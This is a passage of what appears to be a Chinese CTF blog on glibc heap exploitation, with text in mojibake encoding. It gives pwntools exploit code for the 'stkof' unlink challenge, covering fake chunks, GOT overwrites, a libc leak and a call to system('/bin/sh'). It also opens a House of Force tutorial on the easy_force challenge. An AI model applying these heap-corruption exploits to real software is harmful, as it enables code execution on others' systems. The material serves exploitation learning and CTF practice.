<p>å…¨éƒ¨freeå®Œæˆåçš„æƒ…å†µï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212019654.png" alt="image-20251201212019654"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212106544.png" alt="image-20251201212106544"></p>
<p>æ³¨ï¼š0x440æ˜¯<code>chunk2</code>    0x669æ˜¯<code>chunk1</code>    0x9a2æ˜¯<code>chunk3</code> 0x4d0æ˜¯<code>chunk4</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230538872.png" alt="image-20251201230538872"></p>
<p>è¿™é‡Œåœ¨è¿›è¡Œfreeï¼ˆChunk4ï¼‰çš„æ—¶å€™ ç”±äºchunk2ä¸chunk4ç›¸é‚»å°±ä¼šåˆå¹¶chunk2 è€Œchunk1å’Œchunk3çš„bk å’Œ fdå°±ä¼šè¿›è¡ŒUnlink:</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225847125.png" alt="image-20251201225847125"></p>
<p>ä½†æ˜¯è¿˜éœ€è¦ç»•è¿‡ä¸€ä¸‹ä¸‰ä¸ª<strong>æ£€æµ‹</strong>ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225936936.png" alt="image-20251201225936936"></p>
<ol>
<li><p><strong>æ£€æŸ¥1</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„prevsizeçš„å€¼æ˜¯å¦ç­‰äºè¢«é‡Šæ”¾chunkçš„sizeå¤§å°</p>
<p>å¯ä»¥çœ‹å·¦å›¾ç»¿è‰²æ¡†ä¸­çš„å†…å®¹ï¼Œä¸Šé¢ç»¿è‰²æ¡†ä¸­çš„å†…å®¹æ˜¯second_chunkçš„sizeå¤§å°ï¼Œä¸‹é¢ç»¿è‰²æ¡†ä¸­çš„å†…å®¹æ˜¯hollk5çš„prev_sizeï¼Œè¿™ä¸¤ä¸ªç»¿è‰²æ¡†ä¸­çš„æ•°å€¼æ˜¯éœ€è¦ç›¸ç­‰çš„ï¼ˆå¿½ç•¥Pæ ‡å¿—ä½ï¼‰</p>
</li>
<li><p><strong>æ£€æŸ¥2</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„sizeçš„Pæ ‡å¿—ä½æ˜¯å¦ä¸º0</p>
<p>å¯ä»¥çœ‹å·¦å›¾è“è‰²æ¡†ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œæ˜¯hollk5çš„sizeï¼Œhollk5çš„sizeçš„Pæ ‡å¿—ä½ä¸º0ï¼Œä»£è¡¨ç€å®ƒå‰ä¸€ä¸ªchunk(second_chunk)ä¸ºç©ºé—²çŠ¶æ€</p>
</li>
<li><p><strong>æ£€æŸ¥3</strong>ï¼šæ£€æŸ¥å‰åè¢«é‡Šæ”¾chunkçš„fdå’Œbk</p>
<p>å¯ä»¥çœ‹å·¦å›¾çº¢è‰²æ¡†ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œæ˜¯second_chunkçš„fdå’Œbkã€‚é¦–å…ˆçœ‹fdï¼Œå®ƒæŒ‡å‘çš„ä½ç½®å°±æ˜¯å‰ä¸€ä¸ªè¢«é‡Šæ”¾çš„å—first_chunkï¼Œè¿™é‡Œéœ€è¦æ£€æŸ¥çš„æ˜¯first_chunkçš„bkæ˜¯å¦æŒ‡å‘second_chunkçš„åœ°å€ã€‚å†çœ‹second_chunkçš„bkï¼Œå®ƒæŒ‡å‘çš„æ˜¯åä¸€ä¸ªè¢«é‡Šæ”¾çš„å—third_chunkï¼Œè¿™é‡Œéœ€è¦æ£€æŸ¥çš„æ˜¯third_chunkçš„fdæ˜¯å¦æŒ‡å‘second_chunkçš„åœ°å€ã€‚</p>
</li>
</ol>
<h2 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h2><h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214023872.png" alt="image-20251201214023872"></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214134444.png" alt="image-20251201214134444"></p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214139392.png" alt="image-20251201214139392"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214644090.png" alt="image-20251201214644090"></p>
<p>åˆ›ç«‹çš„chunk åªéœ€è¦ç®¡åä¸¤ä¸ªå †å—</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214657971.png" alt="image-20251201214657971"></p>
<p>å­˜å‚¨heapçš„æ•°ç»„n</p>
<p>ä¸‹é¢è®²è§£ä¸€ä¸‹unlinkçš„éƒ¨åˆ†ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) </span><br><span class="line">pay +=p64(<span class="number">0x602138</span>) + p64(<span class="number">0x602140</span>)</span><br><span class="line">pay +=p64(<span class="number">0x20</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pay += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>unlinkçš„ç›®çš„æ˜¯æ§åˆ¶æ•°ç»„n å®ç°ä»»æ„åœ°å€å†™ï¼š</p>
<p>åˆ©ç”¨editä¼ªé€ äº†ä¸€ä¸ªå·²ç»freeæ‰è¿›å…¥unsortedbinä¸­çš„chunk ç„¶åfree(chunk3)çš„æ—¶å€™è§¦å‘unlink å®ç°äº†ä¿®æ”¹chunk3 fdçš„ç›®çš„ã€‚</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230227275.png" alt="image-20251201230227275"></p>
<p>fake chunk:</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215704590.png" alt="image-20251201215704590"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230159757.png" alt="image-20251201230159757"></p>
<p>å¯ä»¥çœ‹åˆ°ç»•è¿‡äº†ä¸Šè¿°çš„æ£€æµ‹ã€‚</p>
<p>è¿™é‡Œçœ‹ä¸€ä¸‹ä¼ªé€ çš„fd å’Œ bk ä¹Ÿå°±æ˜¯chunk3å’Œchunk2ï¼š</p>
<p>è¿™ä¸¤ä¸ªä¼ªé€ çš„å †å—ä½äºæ•°ç»„n</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215923846.png" alt="image-20251201215923846"></p>
<p>38çš„bkå’Œ40çš„fdéƒ½æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„fake chunk </p>
<p>ç„¶åfree chunk3ï¼ˆä¸fake chunkåœ°å€ç›¸é‚»ï¼‰åï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230126886.png" alt="image-20251201230126886"></p>
<p>â‘  fake_chunkè¢«æ‘˜é™¤ä¹‹åé¦–å…ˆæ‰§è¡Œçš„å°±æ˜¯first_bk &#x3D; third_addrï¼Œä¹Ÿå°±æ˜¯è¯´first_chunkçš„bkç”±åŸæ¥æŒ‡å‘fake_chunkåœ°å€æ›´æ”¹æˆæŒ‡å‘third_chunkåœ°å€ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230014783.png" alt="image-20251201230014783"></p>
<p>â‘¡ æ¥ä¸‹æ¥æ‰§è¡Œ<code>third_fd = first_addr</code>ï¼Œå³third_chunkçš„fdç”±ç”±åŸæ¥æŒ‡å‘fake_chunkåœ°å€æ›´æ”¹æˆfirst_chunkåœ°å€ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230046906.png" alt="image-20251201230046906"></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>third_chunkçš„fd</code>ä¸<code>first_chunkçš„bk</code>æ›´æ”¹çš„å…¶å®æ˜¯ä¸€ä¸ªä½ç½®ï¼Œä½†æ˜¯ç”±äºthird_fd &#x3D; first_addr<code>åæ‰§è¡Œ</code>ï¼Œæ‰€ä»¥æ­¤å¤„å†…å®¹ä¼šä»0x602140è¢«è¦†ç›–æˆ0x602138ã€‚</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220335322.png" alt="image-20251201220335322"></p>
<p>æ€»ç»“ä¸€ä¸‹ï¼šæœ€ç»ˆåˆ©ç”¨çš„æ˜¯ä¿®æ”¹third chunk(fake chunk)çš„fdæŒ‡å‘æ•°ç»„nã€‚</p>
<p>åç»­é€šè¿‡æ•°ç»„nå®ç°ä»»æ„åœ°å€å†™ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay2 = p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay2),pay2)</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220933985.png" alt="image-20251201220933985"></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload) //æŠŠfreeè¦†ç›–æˆputså‡½æ•°</span><br><span class="line">puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>





<p>è§¦å‘system(binsh)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload) //æŠŠautiè¦†ç›–æˆsystem</span><br><span class="line">p.send(p64(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/28/House%20of%20force/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/28/House%20of%20force/" class="post-title-link" itemprop="url">House of force</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-11-28 22:39:44" itemprop="dateCreated datePublished" datetime="2025-11-28T22:39:44+08:00">2025-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-11-29 00:30:24" itemprop="dateModified" datetime="2025-11-29T00:30:24+08:00">2025-11-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>4.6k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h1><h2 id="æ¡ä»¶ï¼š"><a href="#æ¡ä»¶ï¼š" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h2><ol>
<li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li>
<li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li>
</ol>
<h2 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h2><p><strong>åˆ©ç”¨mallocå‡½æ•°å¯¹top chunkçš„åˆ©ç”¨ï¼Œä½¿å¾—å †å—æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„åœ°å€ï¼Œå†æ¬¡ç”³è¯·å †å—å°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ã€‚</strong></p>
<h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç :"></a>æºç :</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line"><span class="comment">//nbæ˜¯ç”¨æˆ·ç”³è¯·çš„å †å—çš„å¤§å°åŠ ä¸Šå¤´å †å— </span></span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    <span class="comment">// æ–°çš„top chunkçš„å¤§å°</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb)ï¼›</span><br><span class="line">    <span class="comment">//ç­‰ä»·äºremainder = (mchunkptr)((char*)victim + nb); è·å–æ–°çš„top chunkçš„åœ°å€</span></span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    <span class="comment">//æ›´æ–°top chunkåœ°å€</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="åˆ©ç”¨ï¼š"><a href="#åˆ©ç”¨ï¼š" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h2><p>åªè¦æ»¡è¶³æŠŠtop chunkçš„sizeæ”¹æˆä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ£€æµ‹ã€‚</p>
<p>ä¸€èˆ¬æŠŠtop chunk sizeçš„å€¼æ”¹ä¸º-1 sizeæ˜¯unsigned intç±»å‹å°±ä¼šå˜æˆ0xffffffffffffffff  ä»è€Œç»•è¿‡æ£€æµ‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== è¿™é‡ŒæŠŠtop chunkçš„sizeåŸŸæ”¹ä¸º0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(offset);  <span class="comment">// &lt;=== å‡å°top chunkæŒ‡é’ˆ</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„offsetå°±æ˜¯æƒ³æ§åˆ¶top chunkç§»åŠ¨åçš„ä½ç½®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">offset = target - <span class="number">0x10</span> <span class="comment">//nb</span></span><br><span class="line">       -=top </span><br><span class="line">    </span><br><span class="line"><span class="built_in">malloc</span>(offset) <span class="comment">// æ­¤æ—¶new top chunkçš„å¤´åœ°å€å°±ä¼šä½äº target-0x10çš„ä½ç½®</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>) <span class="comment">//å®ç°ä»»æ„åœ°å€å†™    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>offset</code>ä¹Ÿå¯ä»¥æ˜¯è´Ÿæ•° ï¼ˆæ§åˆ¶<code>topchunk</code>å‘ä½åœ°å€åç§»ï¼‰</p>
<ul>
<li><p>ç”±äºæˆ‘ä»¬çš„<code>top chunk size</code>æ˜¯-1 æ‰€ä»¥å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚</p>
</li>
<li><p><code>new top chunk</code>çš„sizeæˆ‘ä»¬ä¸éœ€è¦å…³ç³» é‡è¦çš„æ˜¯<code>new top chunk</code>çš„åœ°å€ ,ä¹Ÿå°±æ˜¯ï¼š</p>
<p><code>remainder = chunk_at_offset(victim, nb):</code></p>
<p>è¿™é‡Œæˆ‘ä»¬çš„nbæ˜¯ä¸€ä¸ªè´Ÿæ•°  è™½ç„¶è½¬åŒ–æˆunsigned intç±»å‹ä¼šå˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•° ä½†æ˜¯è®¡ç®—çš„æ—¶å€™ä¼šç»è¿‡å¤„ç†å˜æˆæ­£å¸¸çš„åŠ å‡æ³• å°±æŠŠä»–å½“æˆæ­£å¸¸è´Ÿæ•°çœ‹å°±å¥½ã€‚</p>
</li>
</ul>
<h2 id="ä¾‹é¢˜ï¼š2023-ç¾ŠåŸæ¯å†³èµ›easy-force"><a href="#ä¾‹é¢˜ï¼š2023-ç¾ŠåŸæ¯å†³èµ›easy-force" class="headerlink" title="ä¾‹é¢˜ï¼š2023 ç¾ŠåŸæ¯å†³èµ›easy_force"></a>ä¾‹é¢˜ï¼š2023 ç¾ŠåŸæ¯å†³èµ›easy_force</h2><h3 id="mainï¼š"><a href="#mainï¼š" class="headerlink" title="mainï¼š"></a><strong>mainï¼š</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png" alt="image-20251127122736424"></p>
<h3 id="add"><a href="#add" class="headerlink" title="add:"></a><strong>add:</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png" alt="image-20251127122801609"></p>
<h3 id="ä¿æŠ¤ï¼š"><a href="#ä¿æŠ¤ï¼š" class="headerlink" title="ä¿æŠ¤ï¼š"></a><strong>ä¿æŠ¤ï¼š</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png" alt="image-20251127123220721"></p>
<p>è¿™é‡Œåªç»™äº†4æ¬¡addå‡½æ•°çš„æœºä¼š ï¼Œ å…¶ä»–çš„å‡½æ•°éƒ½æ— ç”¨ã€‚</p>
<h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a><strong>æ€è·¯ï¼š</strong></h3><p>é€šè¿‡house of force æŠŠ malloc_hook æ”¹æˆ system(\bin\sh)ã€‚</p>
<h3 id="è§£é¢˜ï¼š"><a href="#è§£é¢˜ï¼š" class="headerlink" title="è§£é¢˜ï¼š"></a><strong>è§£é¢˜ï¼š</strong></h3><h4 id="é¦–å…ˆé€šè¿‡mmapæ³„éœ²libcåŸºåœ°å€ï¼š"><a href="#é¦–å…ˆé€šè¿‡mmapæ³„éœ²libcåŸºåœ°å€ï¼š" class="headerlink" title="é¦–å…ˆé€šè¿‡mmapæ³„éœ²libcåŸºåœ°å€ï¼š"></a>é¦–å…ˆé€šè¿‡<code>mmap</code>æ³„éœ²<code>libc</code>åŸºåœ°å€ï¼š</h4><p>åœ¨å¤„ç†å¤§ chunk æ—¶çš„è¡Œä¸ºï¼š<br>glibc çš„ <code>malloc</code> å¯¹äºå¤§äº<code> mmap_threshold</code> çš„ç”³è¯·ï¼Œä¸ä½¿ç”¨ heapï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ mmap() å‘å†…æ ¸ç”³è¯·ä¸€å—å†…å­˜ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé˜ˆå€¼åœ¨ 128 KB å·¦å³ï¼ˆä¹Ÿå¯èƒ½æ˜¯æ›´å¤§ï¼‰<br>(æ¯”å¦‚ï¼š<code>malloc(0x20000)</code> âœ ä¼šä½¿ç”¨ <code>mmap</code>)</p>
<p><code>mmap </code>åˆ†é…çš„å¤§ <code>chunk</code> åœ°å€è§„å¾‹ï¼š</p>
<p>ä½¿ç”¨<code>mmap()</code>åˆ†é…çš„å†…å­˜å—ï¼Œä¸€èˆ¬åœ¨ libc æ˜ å°„åœ°å€ä¹‹ä¸‹ï¼›<br>åœ¨é»˜è®¤çš„å†…å­˜å¸ƒå±€ä¸­ï¼Œ<code>mmap()</code> è¿”å›çš„åœ°å€å’Œ libc.so çš„åŠ è½½åŸºå€å­˜åœ¨ä¸€ä¸ªå›ºå®šåç§»ï¼›</p>
<p>ç”³è¯·ä¸€ä¸ªè¶…å¤§ chunkï¼ˆè§¦å‘ <code>mmap</code>ï¼‰<br>æ‰“å°è¿™ä¸ª chunk çš„åœ°å€<br>å‡å»åç§»,å¾—åˆ° libc base</p>
<p>è¿™ä¸ªåç§»å€¼æ˜¯å›ºå®šçš„ï¼ˆå–å†³äºç‰¹å®š libc ç‰ˆæœ¬çš„å¸ƒå±€ï¼‰ï¼Œä½ åªè¦çŸ¥é“ libc ç‰ˆæœ¬ï¼Œå°±å¯ä»¥çŸ¥é“åç§»é‡ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libc.address= <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png" alt="Image #1"></p>
